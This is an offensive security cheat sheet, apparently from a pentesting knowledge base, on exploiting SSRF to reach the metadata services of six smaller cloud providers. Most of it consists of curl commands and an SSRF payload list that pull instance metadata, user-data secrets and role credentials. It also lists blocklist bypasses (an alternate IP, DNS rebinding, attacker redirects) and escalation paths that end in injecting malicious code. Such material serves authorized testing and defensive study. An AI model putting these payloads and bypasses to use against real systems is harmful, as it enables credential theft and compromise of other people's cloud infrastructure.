# Other Cloud Providers -- Web Attacks

> **Summary**: Exploitation of cloud-specific services and metadata endpoints for providers beyond AWS, Azure, and GCP.
> **Impact**: Credential theft, data exfiltration, infrastructure compromise via SSRF to cloud metadata services.
> **Typical Severity**: High | Critical

## Detection
### Indicators
- Application hosted on non-major cloud providers (DigitalOcean, Oracle Cloud, Alibaba Cloud, IBM Cloud, Linode, Vultr)
- Cloud-specific domains in source or DNS records
- SSRF-reachable metadata endpoints at `169.254.169.254`

### Automated Detection
```bash
# Multi-cloud resource enumeration
cloud_enum -k <COMPANY_NAME> -l results.txt
```

### Manual Detection
1. Check DNS records and response headers for cloud provider indicators
2. Test SSRF endpoints against known metadata service addresses
3. Look for cloud-specific SDK configurations in JavaScript source

## Exploitation
### Prerequisites
- SSRF vulnerability or exposed cloud credentials
- Knowledge of which cloud provider the target uses

### Step-by-Step

#### 1. DigitalOcean

```bash
# Metadata endpoint (no special headers required)
curl http://169.254.169.254/metadata/v1/
curl http://169.254.169.254/metadata/v1/id
curl http://169.254.169.254/metadata/v1/hostname
curl http://169.254.169.254/metadata/v1/region

# User data (may contain secrets, startup scripts)
curl http://169.254.169.254/metadata/v1/user-data

# DNS name
curl http://169.254.169.254/metadata/v1/dns/nameservers

# Floating IP
curl http://169.254.169.254/metadata/v1/floating_ip/ipv4/active

# DigitalOcean Spaces (S3-compatible)
# Check for public access:
curl "https://<SPACE_NAME>.<REGION>.digitaloceanspaces.com"
```

#### 2. Oracle Cloud Infrastructure (OCI)

```bash
# IMDS v1 (no headers required)
curl http://169.254.169.254/opc/v1/instance/
curl http://169.254.169.254/opc/v1/instance/metadata/

# IMDS v2 (requires authorization header)
TOKEN=$(curl -H "Authorization: Bearer Oracle" \
  http://169.254.169.254/opc/v2/instance/)

# User data
curl http://169.254.169.254/opc/v1/instance/metadata/user_data

# Identity
curl http://169.254.169.254/opc/v1/identity/
curl http://169.254.169.254/opc/v1/identity/cert.pem

# Object Storage
# Public bucket:
curl "https://objectstorage.<REGION>.oraclecloud.com/n/<NAMESPACE>/b/<BUCKET>/o"
```

#### 3. Alibaba Cloud (Aliyun)

```bash
# Metadata (no special headers required)
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/meta-data/instance-id
curl http://100.100.100.200/latest/meta-data/hostname

# RAM role credentials
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<ROLE_NAME>

# User data
curl http://100.100.100.200/latest/user-data/

# OSS (Object Storage Service)
# Check for public access:
curl "https://<BUCKET>.<REGION>.aliyuncs.com"
```

> Note: Alibaba Cloud uses `100.100.100.200` instead of `169.254.169.254`.

#### 4. IBM Cloud

```bash
# VPC metadata (requires authorization token)
# Get token
TOKEN=$(curl -X PUT "http://api.metadata.cloud.ibm.com/instance_identity/v1/token?version=2022-03-01" \
  -H "Metadata-Flavor: ibm" \
  -d '{"expires_in": 3600}')

# Instance metadata
curl -H "Authorization: Bearer $TOKEN" \
  "http://api.metadata.cloud.ibm.com/metadata/v1/instance?version=2022-03-01"

# Initialization data
curl -H "Authorization: Bearer $TOKEN" \
  "http://api.metadata.cloud.ibm.com/metadata/v1/instance/initialization?version=2022-03-01"

# Cloud Object Storage
# Public bucket:
curl "https://<BUCKET>.s3.<REGION>.cloud-object-storage.appdomain.cloud"
```

#### 5. Hetzner Cloud

```bash
# Metadata (no special headers)
curl http://169.254.169.254/hetzner/v1/metadata
curl http://169.254.169.254/hetzner/v1/metadata/hostname
curl http://169.254.169.254/hetzner/v1/metadata/instance-id

# User data
curl http://169.254.169.254/hetzner/v1/userdata

# Private networks
curl http://169.254.169.254/hetzner/v1/metadata/private-networks
```

#### 6. Linode (Akamai Connected Cloud)

```bash
# Metadata (no special headers)
curl http://169.254.169.254/v1.0/
curl http://169.254.169.254/v1.0/label
curl http://169.254.169.254/v1.0/region

# User data
curl http://169.254.169.254/v1.0/user-data
```

### Payloads

#### Universal Metadata SSRF Payloads
```
# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/user-data

# Oracle Cloud
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/identity/

# Alibaba Cloud (different IP!)
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# IBM Cloud
http://api.metadata.cloud.ibm.com/metadata/v1/instance

# Hetzner
http://169.254.169.254/hetzner/v1/metadata

# Linode
http://169.254.169.254/v1.0/
```

### Proof of Concept

SSRF cloud metadata detection:
1. Find SSRF endpoint
2. Iterate through all known metadata endpoints to fingerprint the cloud provider
3. Extract credentials or user-data secrets
4. Use provider-specific CLI to enumerate resources

## Bypasses
- **DigitalOcean / Hetzner / Linode**: No special headers required -- standard GET SSRF works
- **Oracle Cloud v1**: No headers required, simpler to exploit than v2
- **Alibaba Cloud**: Different IP address (`100.100.100.200`) may bypass blocklists that only filter `169.254.169.254`
- **DNS rebinding**: Resolve attacker domain to `169.254.169.254` (or `100.100.100.200` for Alibaba) after validation
- **Redirect-based**: 302 redirect from attacker server to metadata endpoint

## Escalation
- From cloud credentials: enumerate all resources, pivot to databases, storage, other services
- From user-data secrets: often contains database passwords, API keys, deployment scripts
- From storage write access: overwrite application files, inject malicious code

## Tools
| Tool | Usage |
|------|-------|
| [cloud_enum](https://github.com/initstring/cloud_enum) | `cloud_enum -k <COMPANY>` -- Multi-cloud resource enumeration |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | Multi-cloud security auditing (supports AWS, Azure, GCP, Alibaba, OCI) |
| [s3scanner](https://github.com/sa7mon/S3Scanner) | Works with S3-compatible providers (DigitalOcean Spaces, etc.) |
| [CloudBrute](https://github.com/0xsha/CloudBrute) | Multi-cloud enumerator for storage and apps |

## References
- [DigitalOcean Metadata API](https://docs.digitalocean.com/reference/api/metadata-api/)
- [Oracle Cloud IMDS](https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm)
- [Alibaba Cloud Metadata](https://www.alibabacloud.com/help/doc-detail/49122.htm)
- [Hacking the Cloud](https://hackingthe.cloud/)

**See also**: [SSRF](../vulns/ssrf.md) | [AWS](aws.md) | [Azure](azure.md) | [GCP](gpc.md)
